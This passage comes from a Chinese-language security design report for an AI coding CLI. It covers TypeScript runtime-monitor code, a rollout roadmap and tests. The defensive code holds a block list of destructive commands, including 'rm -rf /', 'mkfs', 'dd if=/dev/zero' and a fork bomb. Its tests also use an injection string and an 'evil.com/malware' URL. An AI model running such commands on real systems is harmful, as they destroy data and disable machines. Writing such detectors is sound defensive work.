          timestamp: new Date()
        });

        this.auditLogger.logNetworkRequest(url, method, 'denied');

        return {
          allowed: false,
          reason: 'Connection blocked by network allowlist',
          statusCode: 403,
          headers: {
            'Content-Type': 'text/plain',
            'X-Proxy-Error': 'blocked-by-allowlist'
          }
        };
      }
    }

    // 4. 检查协议
    if (this.config.network?.enableSSL && protocol === 'http:') {
      this.emitEvent({
        type: 'network',
        action: 'insecure_protocol',
        resource: url,
        allowed: false,
        reason: 'HTTP not allowed, use HTTPS',
        timestamp: new Date()
      });

      this.auditLogger.logNetworkRequest(url, method, 'denied');

      return {
        allowed: false,
        reason: 'HTTP not allowed, SSL/TLS required',
        statusCode: 403
      };
    }

    // 请求被允许
    this.auditLogger.logNetworkRequest(url, method, 'success');
    return { allowed: true };
  }

  // ========== 文件访问控制 ==========

  /**
   * 拦截文件操作
   */
  async interceptFileAccess(operation: FileOperation): Promise<{
    allowed: boolean;
    reason?: string;
  }> {
    const { path, operation: op } = operation;
    const absolutePath = require('path').resolve(path);

    // 1. 检查路径遍历
    if (this.commandDetector.detectPathTraversal(path)) {
      this.emitEvent({
        type: 'file',
        action: 'path_traversal',
        resource: path,
        allowed: false,
        reason: 'Path traversal detected',
        timestamp: new Date()
      });

      this.auditLogger.logFileAccess(path, op, 'denied');

      return {
        allowed: false,
        reason: 'Path traversal not allowed'
      };
    }

    // 2. 检查工作目录限制
    if (this.config.filesystem?.restrictToWorkdir) {
      const workdir = process.cwd();
      if (!absolutePath.startsWith(workdir)) {
        this.emitEvent({
          type: 'file',
          action: 'outside_workdir',
          resource: path,
          allowed: false,
          reason: 'Access outside working directory',
          timestamp: new Date()
        });

        this.auditLogger.logFileAccess(path, op, 'denied');

        return {
          allowed: false,
          reason: 'Access restricted to working directory'
        };
      }
    }

    // 3. 检查路径 allowlist
    if (this.config.permissions?.paths?.allow) {
      const allowed = this.config.permissions.paths.allow.some(allowedPath =>
        absolutePath.startsWith(require('path').resolve(allowedPath))
      );

      if (!allowed) {
        this.emitEvent({
          type: 'file',
          action: 'path_not_allowed',
          resource: path,
          allowed: false,
          reason: 'Path not in allowlist',
          timestamp: new Date()
        });

        this.auditLogger.logFileAccess(path, op, 'denied');

        return {
          allowed: false,
          reason: 'Path not in allowlist'
        };
      }
    }

    // 4. 检查路径 blocklist
    if (this.config.permissions?.paths?.deny) {
      const denied = this.config.permissions.paths.deny.some(deniedPath =>
        absolutePath.startsWith(require('path').resolve(deniedPath))
      );

      if (denied) {
        this.emitEvent({
          type: 'file',
          action: 'path_denied',
          resource: path,
          allowed: false,
          reason: 'Path in denylist',
          timestamp: new Date()
        });

        this.auditLogger.logFileAccess(path, op, 'denied');

        return {
          allowed: false,
          reason: 'Path in denylist'
        };
      }
    }

    // 5. 检查文件扩展名
    if (op === 'execute' && this.config.filesystem?.blockedExtensions) {
      const ext = require('path').extname(path).toLowerCase();
      if (this.config.filesystem.blockedExtensions.includes(ext)) {
        this.emitEvent({
          type: 'file',
          action: 'extension_blocked',
          resource: path,
          allowed: false,
          reason: 'File extension blocked',
          timestamp: new Date()
        });

        this.auditLogger.logFileAccess(path, op, 'denied');

        return {
          allowed: false,
          reason: `Extension ${ext} is blocked`
        };
      }
    }

    // 操作被允许
    this.auditLogger.logFileAccess(path, op, 'success');
    return { allowed: true };
  }

  // ========== 命令执行控制 ==========

  /**
   * 拦截命令执行
   */
  async interceptCommand(command: string): Promise<{
    allowed: boolean;
    reason?: string;
    sanitizedCommand?: string;
  }> {
    // 1. 检测命令注入
    const injectionResult = this.commandDetector.detect(command, {
      allowShellMetachars: this.config.execution?.allowShellCommands ?? true,
      maxLength: 10000
    });

    if (!injectionResult.safe) {
      const criticalViolations = injectionResult.violations.filter(
        v => v.severity === 'critical'
      );

      if (criticalViolations.length > 0) {
        this.emitEvent({
          type: 'command',
          action: 'injection_detected',
          resource: command,
          allowed: false,
          reason: 'Command injection detected',
          timestamp: new Date()
        });

        return {
          allowed: false,
          reason: `Critical security violations: ${criticalViolations.map(v => v.pattern).join(', ')}`
        };
      }
    }

    // 2. 检查命令 blocklist
    if (this.config.permissions?.commands?.deny) {
      for (const denied of this.config.permissions.commands.deny) {
        if (command.includes(denied)) {
          this.emitEvent({
            type: 'command',
            action: 'command_denied',
            resource: command,
            allowed: false,
            reason: 'Command in denylist',
            timestamp: new Date()
          });

          return {
            allowed: false,
            reason: `Command contains blocked pattern: ${denied}`
          };
        }
      }
    }

    // 3. 检查危险命令（如果启用阻止）
    if (this.config.execution?.dangerousCommandsBlocked) {
      const dangerousPatterns = [
        'rm -rf /',
        'mkfs',
        'dd if=/dev/zero',
        'format',
        ':(){:|:&};:' // fork bomb
      ];

      for (const pattern of dangerousPatterns) {
        if (command.includes(pattern)) {
          this.emitEvent({
            type: 'command',
            action: 'dangerous_command',
            resource: command,
            allowed: false,
            reason: 'Dangerous command blocked',
            timestamp: new Date()
          });

          return {
            allowed: false,
            reason: `Dangerous command blocked: ${pattern}`
          };
        }
      }
    }

    return {
      allowed: true,
      sanitizedCommand: command
    };
  }

  // ========== 权限检查 ==========

  /**
   * 检查工具权限
   */
  checkToolPermission(toolName: string): {
    allowed: boolean;
    reason?: string;
  } {
    // 1. 检查 allowlist
    if (this.config.permissions?.tools?.allow) {
      const allowed = this.config.permissions.tools.allow.includes(toolName);

      if (!allowed) {
        this.auditLogger.logPermissionCheck(toolName, false, 'Tool not in allowlist');

        return {
          allowed: false,
          reason: 'Tool not in allowlist'
        };
      }
    }

    // 2. 检查 denylist
    if (this.config.permissions?.tools?.deny) {
      const denied = this.config.permissions.tools.deny.includes(toolName);

      if (denied) {
        this.auditLogger.logPermissionCheck(toolName, false, 'Tool in denylist');

        return {
          allowed: false,
          reason: 'Tool in denylist'
        };
      }
    }

    this.auditLogger.logPermissionCheck(toolName, true);
    return { allowed: true };
  }

  // ========== 事件系统 ==========

  /**
   * 监听监控事件
   */
  on(eventType: string, callback: (event: MonitorEvent) => void): void {
    if (!this.eventListeners.has(eventType)) {
      this.eventListeners.set(eventType, []);
    }
    this.eventListeners.get(eventType)!.push(callback);
  }

  /**
   * 触发事件
   */
  private emitEvent(event: MonitorEvent): void {
    const listeners = this.eventListeners.get(event.type) || [];
    const allListeners = this.eventListeners.get('*') || [];

    [...listeners, ...allListeners].forEach(callback => {
      try {
        callback(event);
      } catch (error) {
        console.error('Error in monitor event listener:', error);
      }
    });
  }

  // ========== 统计信息 ==========

  /**
   * 获取监控统计
   */
  async getStatistics(): Promise<{
    totalEvents: number;
    blockedRequests: number;
    allowedRequests: number;
    byType: Record<string, number>;
  }> {
    // 从审计日志查询
    const events = await this.auditLogger.query({
      types: ['network', 'file_access', 'permission']
    });

    const stats = {
      totalEvents: events.length,
      blockedRequests: events.filter(e => e.result === 'denied').length,
      allowedRequests: events.filter(e => e.result === 'success').length,
      byType: {} as Record<string, number>
    };

    for (const event of events) {
      stats.byType[event.type] = (stats.byType[event.type] || 0) + 1;
    }

    return stats;
  }
}

// ========== 工具函数 ==========

let globalMonitor: RuntimeMonitor | null = null;

/**
 * 获取全局运行时监控器
 */
export function getRuntimeMonitor(config?: MonitorConfig): RuntimeMonitor {
  if (!globalMonitor && config) {
    globalMonitor = new RuntimeMonitor(config);
  }
  if (!globalMonitor) {
    throw new Error('Runtime monitor not initialized');
  }
  return globalMonitor;
}

/**
 * 初始化运行时监控器
 */
export function initRuntimeMonitor(config: MonitorConfig): RuntimeMonitor {
  globalMonitor = new RuntimeMonitor(config);
  return globalMonitor;
}
```

#### 集成示例

```typescript
// src/tools/bash.ts

import { getRuntimeMonitor } from '../security/runtime-monitor.js';

export class BashTool extends BaseTool {
  async execute(command: string): Promise<ToolResult> {
    const monitor = getRuntimeMonitor();

    // 1. 拦截命令
    const commandCheck = await monitor.interceptCommand(command);
    if (!commandCheck.allowed) {
      throw new Error(`Command blocked: ${commandCheck.reason}`);
    }

    // 2. 执行命令
    const result = await this.runCommand(command);

    // 3. 过滤输出
    result.output = this.filterOutput(result.output);

    return result;
  }
}

// src/tools/web-fetch.ts

import { getRuntimeMonitor } from '../security/runtime-monitor.js';

export class WebFetchTool extends BaseTool {
  async execute(url: string): Promise<ToolResult> {
    const monitor = getRuntimeMonitor();

    // 拦截网络请求
    const requestCheck = await monitor.interceptNetworkRequest({
      url,
      method: 'GET'
    });

    if (!requestCheck.allowed) {
      throw new Error(`Network request blocked: ${requestCheck.reason}`);
    }

    // 继续请求
    const response = await fetch(url);
    const content = await response.text();

    return { content };
  }
}
```

---

## 第四部分：实施路线图

### 阶段 1: 基础安全（1-2 周）

**优先级**: 🔴 高

1. ✅ **命令注入检测** (T-001)
   - 实现 `CommandInjectionDetector` 类
   - 集成到 `BashTool` 和所有命令执行路径
   - 添加单元测试和集成测试

2. ✅ **敏感信息过滤增强** (T-002)
   - 扩展现有 `SensitiveDataDetector`
   - 实现 `RuntimeSensitiveFilter`
   - 集成到所有工具输出路径

3. ✅ **基础审计日志**
   - 确保所有安全事件被记录
   - 添加自动清理机制

### 阶段 2: 运行时监控（2-3 周）

**优先级**: 🟠 中高

1. ✅ **运行时监控器** (T-003)
   - 实现 `RuntimeMonitor` 类
   - 网络访问拦截
   - 文件访问拦截
   - 命令执行拦截

2. ✅ **工具集成**
   - 修改所有工具以使用监控器
   - 添加权限检查钩子
   - 实现事件监听系统

### 阶段 3: 沙箱隔离（3-4 周）

**优先级**: 🟡 中

1. **Bubblewrap 集成**
   - 检测 Bubblewrap 可用性
   - 实现 `SandboxExecutor` 类
   - 配置沙箱参数
   - 添加平台兼容性检查（Linux only）

2. **沙箱配置**
   - 只读系统目录绑定
   - 临时目录管理
   - 命名空间隔离
   - 可选网络隔离

### 阶段 4: 高级功能（1-2 周）

**优先级**: 🟢 低

1. **实时告警**
   - 实现告警系统
   - 集成 Webhook 通知
   - 配置告警规则

2. **合规报告**
   - 自动生成合规报告
   - SOC2/ISO27001 模板
   - 定期审计导出

---

## 第五部分：测试策略

### 单元测试

```typescript
// tests/security/command-injection.test.ts

import { describe, it, expect } from 'vitest';
import { CommandInjectionDetector } from '../../src/security/command-injection.js';

describe('CommandInjectionDetector', () => {
  const detector = new CommandInjectionDetector();

  it('should detect command chaining', () => {
    const result = detector.detect('ls -la; rm -rf /');
    expect(result.safe).toBe(false);
    expect(result.violations).toHaveLength(1);
    expect(result.violations[0].severity).toBe('critical');
  });

  it('should detect command substitution', () => {
    const result = detector.detect('echo `whoami`');
    expect(result.safe).toBe(false);
    expect(result.violations.some(v => v.pattern === 'Command Substitution (backtick)')).toBe(true);
  });

  it('should allow safe commands', () => {
    const result = detector.detect('ls -la /home/user');
    expect(result.safe).toBe(true);
  });
});
```

### 集成测试

```typescript
// tests/security/runtime-monitor.test.ts

import { describe, it, expect, beforeEach } from 'vitest';
import { RuntimeMonitor } from '../../src/security/runtime-monitor.js';
import { AuditLogger } from '../../src/security/audit.js';
import { createDefaultSecureConfig } from '../../src/security/validate.js';

describe('RuntimeMonitor', () => {
  let monitor: RuntimeMonitor;

  beforeEach(() => {
    monitor = new RuntimeMonitor({
      security: createDefaultSecureConfig(),
      auditLogger: new AuditLogger()
    });
  });

  it('should block requests to non-allowed domains', async () => {
    const result = await monitor.interceptNetworkRequest({
      url: 'https://evil.com/malware',
      method: 'GET'
    });

    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('allowlist');
  });

  it('should allow requests to trusted domains', async () => {
    const result = await monitor.interceptNetworkRequest({
      url: 'https://api.anthropic.com/v1/messages',
      method: 'POST'
    });

    expect(result.allowed).toBe(true);
  });
});
```

---

## 第六部分：性能考虑

### 性能优化建议

1. **正则表达式编译缓存**
   ```typescript
   const patternCache = new Map<string, RegExp>();
   function getCachedPattern(pattern: string): RegExp {
     if (!patternCache.has(pattern)) {
       patternCache.set(pattern, new RegExp(pattern, 'g'));
     }
     return patternCache.get(pattern)!;
   }
   ```

2. **异步批处理**
   ```typescript
   class BatchProcessor {
     private queue: Array<() => Promise<void>> = [];

     async add(task: () => Promise<void>): Promise<void> {
       this.queue.push(task);
       if (this.queue.length >= 10) {
         await this.flush();
       }
     }

     async flush(): Promise<void> {
       const tasks = this.queue.splice(0);
       await Promise.all(tasks.map(t => t()));
     }
   }
   ```

3. **内容截断早期检查**
   ```typescript
   function shouldTruncate(content: string, maxLength: number): boolean {
     // 快速长度检查，避免不必要的字符串操作
     return content.length > maxLength;
   }
   ```

### 基准测试目标

- **命令检测**: < 5ms per command
- **敏感信息过滤**: < 10ms per 1KB
- **网络拦截**: < 2ms per request
- **审计日志写入**: < 1ms per event

---

## 附录：参考行号对照表

### 官方 CLI 关键实现位置

| 功能 | 近似行号 | 说明 |
|------|---------|------|
| 进程错误检测 | 28 | `ENOENT`, `EACCES`, `EPERM`, `ERR_CHILD_PROCESS_STDIO_MAXBUFFER` |
| 敏感信息屏蔽 | 974-975 | `federatedTokenFilePath: [REDACTED]` |
| 内容截断 | 1684, 2208 | `[TRUNCATED - Content exceeds 60KB]` |
| 网络 Allowlist | 449-461 | `Connection blocked by network allowlist` |
| Shell 转义 | 462-463 | `shellQuote([command])` |
| Ripgrep 错误处理 | 28 | EAGAIN 错误重试逻辑 |
| 遥测系统 | 1699-1710 | OpenTelemetry 集成 |

---

## 总结

### 关键发现

1. **官方实现高度注重安全**
   - 多层防御（命令检测、网络过滤、路径验证）
   - 自动清洗敏感信息
   - 详细的审计日志
   - 沙箱隔离（Bubblewrap）

2. **本项目已有良好基础**
   - 配置验证系统完善
   - 敏感数据检测全面
   - 审计日志功能强大

3. **主要差距**
   - 缺少运行时拦截机制
   - 命令注入检测未实现
   - 沙箱隔离未集成

### 建议的实施顺序

1. **立即实施** (第1周): 命令注入检测 (T-001)
2. **近期实施** (第2-3周): 运行时监控 (T-003)
3. **中期实施** (第4-6周): 沙箱集成
4. **长期改进**: 高级告警和合规报告

---

**报告生成**: Claude Code Analysis Tool
**版本**: 1.0.0
**最后更新**: 2025-12-26
